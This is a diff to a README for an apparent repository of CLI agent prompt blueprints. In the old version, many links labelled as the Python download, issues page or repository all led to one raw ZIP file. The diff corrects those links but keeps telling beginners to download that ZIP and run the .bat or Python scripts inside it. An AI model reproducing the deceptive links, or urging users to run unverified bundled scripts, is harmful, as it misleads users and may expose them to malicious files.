@@ -24,11 +24,11 @@ Use these blueprints to learn, customize, or start your own AI-driven CLI agent 
 
 ---
 
-## 🌐 Visit to Download
+## 🌐 Download the Bundle
 
-Click the button below to visit the release page where you can download the latest version. This page includes all available versions and related files.
+Click the button below to download the current blueprint bundle as a ZIP file.
 
-[![Download Releases](https://img.shields.io/badge/Visit-Release_Page-blue)](https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip)
+[![Download Bundle](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip)
 
 ---
 
@@ -36,20 +36,17 @@ Click the button below to visit the release page where you can download the late
 
 This section guides you step-by-step through downloading and running the software on a Windows machine. The instructions assume no prior experience with command-line tools.
 
-### Step 1: Go to the Release Page
+### Step 1: Download the Bundle
 
-Open your web browser and go to the release page here:
+Open the ZIP link in your web browser:
 
 https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip
 
-You will see a list of releases. Look for the latest stable version. It will usually have a tag like `v1.0` or higher.
+Your browser will download `agent_prompts_awesome_cli_2.6.zip`.
 
-### Step 2: Download the Release Package
+### Step 2: Locate the Download
 
-Each release typically contains a `.zip` or executable file. Most releases have a zip file with all blueprints you can unzip and explore.
-
-- Find the file labeled similar to `awesome-cli-agent-prompts-x.x.x.zip`.
-- Click it to download. The file will appear in your `Downloads` folder.
+Find `agent_prompts_awesome_cli_2.6.zip` in your browser's download folder.
 
 ### Step 3: Extract the Downloaded Files
 
@@ -77,7 +74,7 @@ Running these blueprints might require additional tools or simple scripts:
   ```
 - Some blueprints may include batch files (`.bat`) or Python scripts. Running those will launch the agent simulations.
 
-If you don’t have Python installed and the scripts require it, you can download it from https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip
+If you don’t have Python installed and the scripts require it, you can download it from https://python.org/downloads.
 
 ### Step 6: Learn and Customize
 
@@ -112,9 +109,9 @@ Think of it as a blueprint for building your own CLI agent, step by step, with c
 
 If you face any issues:
 
-- Check the issues section on the GitHub page: https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip  
-- Read through the `README.md` and `AGENTS.md` files included with the download for help on setup and usage  
-- Explore community discussions on GitHub for tips and shared solutions  
+- Read the `README.md` and blueprint files included with the download.
+- Review the contribution guide for repository and submission requirements:
+  https://github.com/Justicution/awesome-cli-agent-prompts/blob/main/CONTRIBUTING.md
 
 ---
 
@@ -122,10 +119,9 @@ If you face any issues:
 
 To update to a newer version:
 
-1. Visit the release page at https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip
-2. Download the latest zip file.
-3. Extract it to a new folder.
-4. Replace or move your old files if you have customized versions, keeping backups just in case.
+1. Download the current ZIP from https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip
+2. Extract it to a new folder.
+3. Replace or move your old files if you have customized versions, keeping backups just in case.
 
 ---
 
@@ -133,12 +129,12 @@ To update to a newer version:
 
 Use this link any time to get the latest versions and files:
 
-[Download Releases](https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip)
+[Download Current Bundle](https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip)
 
 ---
 
 ## 🔗 Useful Links
 
-- Main repository page: https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip  
-- Chinese version of README: https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip  
-- Issues and support: https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip  
+- Main repository page: https://github.com/Justicution/awesome-cli-agent-prompts
+- Chinese version of README: https://github.com/Justicution/awesome-cli-agent-prompts/blob/main/README_zh.md
+- Contribution guide: https://github.com/Justicution/awesome-cli-agent-prompts/blob/main/CONTRIBUTING.md
